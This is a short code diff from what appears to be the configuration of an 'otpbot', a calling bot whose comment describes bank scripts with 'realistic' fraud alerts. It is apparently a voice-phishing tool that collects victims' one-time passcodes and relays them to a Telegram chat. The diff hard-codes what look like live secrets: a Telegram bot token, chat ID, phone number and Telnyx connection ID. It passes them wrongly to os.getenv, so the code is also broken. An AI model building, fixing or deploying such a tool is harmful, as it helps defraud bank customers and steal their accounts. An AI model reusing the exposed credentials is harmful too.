@@ -15,7 +15,7 @@ TELNYX_PHONE_NUMBER = os.getenv("+1-202-992-7750")
 TELEGRAM_BOT_TOKEN = os.getenv("8114216517:AAHIXqUjMz_q6dVSnvOMJv4ZCllG56CEYxU")
 TELEGRAM_CHAT_ID = os.getenv("7588932538")
 TELNYX_CONNECTION_ID = os.getenv("2756508958087710186")
-VERCEL_URL = os.getenv("VERCEL_URL")  # Your Vercel app URL
+VERCEL_URL = os.getenv("otpbot-delta.vercel.app")  # Your Vercel app URL
 
 # Bank scripts with realistic "1:1" fraud alerts
 # In-memory state for calls (non-persistent)
